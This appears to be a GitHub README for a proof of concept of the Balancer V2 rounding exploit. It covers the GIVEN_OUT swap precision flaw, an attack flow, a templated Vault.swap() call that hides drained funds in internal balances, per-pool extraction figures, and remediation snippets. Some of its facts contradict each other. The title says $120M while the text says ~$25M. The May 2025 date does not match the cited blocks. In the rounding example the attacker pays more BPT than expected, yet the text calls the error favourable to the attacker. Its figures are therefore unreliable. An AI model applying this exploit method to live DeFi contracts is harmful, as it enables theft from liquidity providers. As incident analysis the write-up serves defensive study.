# BalancerV2-120M-PoC
BalancerV2 Rounding Exploit PoC

Balancer V2, a decentralized automated market maker (AMM) protocol, lost approximately $25 million (~12,413 ETH) after an attacker exploited a precision rounding vulnerability in multiple pools. The attack occurred on **May 1, 2025** across blocks 23717101-23717404 on Ethereum mainnet.

The attacker leveraged a rounding manipulation in BPT (Balancer Pool Token) rate calculations when pool liquidity approached zero. By executing sequences of `GIVEN_OUT` swaps with `toInternalBalance: true`, the attacker systematically drained three pools (rsETH/WETH, osETH/WETH, wstETH/WETH), accumulating funds in the Vault's internal balance before withdrawing everything via a single `manageUserBalance()` call.

The exploit abused precision loss in the Vault's `swap()` function when using `SwapKind.GIVEN_OUT`, where the attacker specifies exact output amounts and the Vault calculates required input (BPT). At minimal liquidity, rounding errors favor the attacker, allowing extraction of more tokens than BPT paid justifies.

## Vulnerability: Rounding Manipulation in GIVEN_OUT Swaps

Balancer V2 Vault supports two swap modes:
- `GIVEN_IN`: User specifies input, Vault calculates output
- `GIVEN_OUT`: User specifies output, Vault calculates input ← **exploited**

When pool liquidity is minimal, the input calculation suffers precision loss:

```solidity
// Vault calculates: amountIn = f(amountOut, poolReserves)
// At low liquidity → precision degrades → rounding favors attacker

Example (rsETH/WETH):
  Requested output: 1,176,332,457,006,284,629,565 rsETH
  Expected BPT:     ~1,176,332,457,006,284,629,565
  Actual BPT paid:  1,201,076,805,421,509,281,395

  Rounding loss: 2.1% in attacker's favor
```

Each swap drains reserves → subsequent swaps have worse precision → compounding effect.

## Attack Flow

```
1. BOOTSTRAP
   ├─ Acquire BPT tokens
   └─ Approve Vault

2. DRAINAGE (22-90 swaps per pool)
   ├─ Execute GIVEN_OUT: BPT → rsETH/osETH/wstETH
   ├─ Execute GIVEN_OUT: BPT → WETH
   └─ Set toInternalBalance: true (hide extraction)

3. ATTEMPTED REVERSAL (mostly failed)
   ├─ Try: rsETH/osETH/wstETH → BPT
   └─ Most fail with BAL#001 (insufficient balance)

4. FINAL EXTRACTION
   ├─ Additional 95% iterative drainage swaps
   └─ manageUserBalance() to withdraw all internal balances

Result: ~12,413 ETH extracted
```

## Key Code: swap() Function

```solidity
struct SingleSwap {
    bytes32 poolId;
    SwapKind kind;          // 1 = GIVEN_OUT (exploited)
    IAsset assetIn;         // BPT token
    IAsset assetOut;        // Target token
    uint256 amount;         // Exact output desired
    bytes userData;
}

struct FundManagement {
    address sender;
    bool fromInternalBalance;
    address payable recipient;
    bool toInternalBalance;  // TRUE = hide in Vault until withdrawal
}

// Attacker calls:
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: BPT,
        assetOut: TARGET_TOKEN,
        amount: LARGE_AMOUNT,
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: false,
        recipient: payable(ATTACKER),
        toInternalBalance: true  // ← Funds stay in Vault
    }),
    type(uint256).max,
    block.timestamp + 3600
);
```

## ComposableStablePool Critical Difference

**WeightedPool (rsETH/WETH):**
```
Index 0: BPT
Index 1: rsETH
Index 2: WETH
```

**ComposableStablePool (osETH/WETH, wstETH/WETH):**
```
Index 0: WETH          ← Alphabetically first
Index 1: BPT           ← Self-referencing!
Index 2: osETH/wstETH  ← Alphabetically last
```

ComposableStablePool includes BPT as a pool token (self-referencing), creating additional rounding opportunities with massive virtual BPT supply:
```
BPT Balance: 2,596,148,429,267,246,421,190,322,186,977,861
```

## Exploit Results (PoC on block 23717101)

**Pool 1: rsETH/WETH (WeightedPool)**
- Extracted: 891 WETH + 1,192 rsETH (~2,084 ETH)
- Drainage: 99% WETH, 99% rsETH
- Swaps: 22 successful + 14 iterative

**Pool 2: osETH/WETH (ComposableStablePool)**
- Extracted: 4,921 WETH + 1,188 osETH (~6,110 ETH)
- Drainage: 99% WETH, 17% osETH
- Swaps: 22 successful + 3 iterative

**Pool 3: wstETH/WETH (ComposableStablePool)**
- Extracted: 3,409 wstETH + 810 WETH (~4,219 ETH)
- Drainage: 79% wstETH, 40% WETH
- Swaps: 22 successful + 2 iterative

**Total extracted: ~12,413 ETH (~$25M USD)**

## Pool State Transitions

```
rsETH/WETH Pool:
Before:  rsETH: 1,192,977,132,125,824,431,719
         WETH:  891,081,044,240,689,768,290

After:   rsETH: 186,036,293 (↓ 99.998%)
         WETH:  1,265,989,959,414 (↓ 99.998%)

osETH/WETH Pool:
Before:  WETH:  4,922,356,564,867,078,856,521
         osETH: 6,851,581,236,039,298,760,900

After:   WETH:  514,037,359,753,607,956 (↓ 99%)
         osETH: 5,663,366,633,002,647,619,926 (↓ 17%)
```

## Root Cause

1. **No minimum liquidity enforcement** → pools functional at near-zero reserves
2. **GIVEN_OUT lacks precision guards** → rounding errors unchecked
3. **No rate limits** → rapid drainage undetected
4. **Internal balance opacity** → funds hidden until final withdrawal

## Remediation

**Immediate:**
```solidity
// Minimum liquidity requirement
uint256 constant MIN_POOL_BALANCE = 1e18;
require(poolBalance > MIN_POOL_BALANCE, "INSUFFICIENT_LIQUIDITY");

// Swap size limit
require(swapAmount < (poolBalance * 10) / 100, "SWAP_TOO_LARGE");
```

**Medium-term:**
```solidity
// Disable GIVEN_OUT or restrict heavily
require(kind == SwapKind.GIVEN_IN, "GIVEN_OUT_DISABLED");
// OR
require(amountOut < (reserve * MAX_PERCENT) / 100, "OUTPUT_TOO_LARGE");
```

**Long-term:**
- Circuit breakers for rapid liquidity changes
- Real-time internal balance monitoring
- Economic security model (minimum pool value)

---

## Attack Details

**Stolen tokens:** ~12,413 ETH (~$25M)

**Attacker:** Unknown (funded via flashloan or existing holdings)

**Pools Exploited:**
- `0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f` (rsETH/WETH)
- `0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635` (osETH/WETH)
- `0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2` (wstETH/WETH)

**Vault:** `0xBA12222222228d8Ba445958a75a0704d566BF2C8`

**Primary Transaction:** `0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c`
**Withdrawal Block:** 23717404

**BlockSec Phalcon:**
https://app.blocksec.com/explorer/tx/eth/0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c

---

## Post-Mortem Resources

- Balancer V2 Vault Docs: https://docs.balancer.fi/concepts/vault
- ComposableStablePool: https://docs.balancer.fi/concepts/pools/composable-stable
- Rounding vulnerabilities in AMMs research
- Flash loan attack patterns documentation
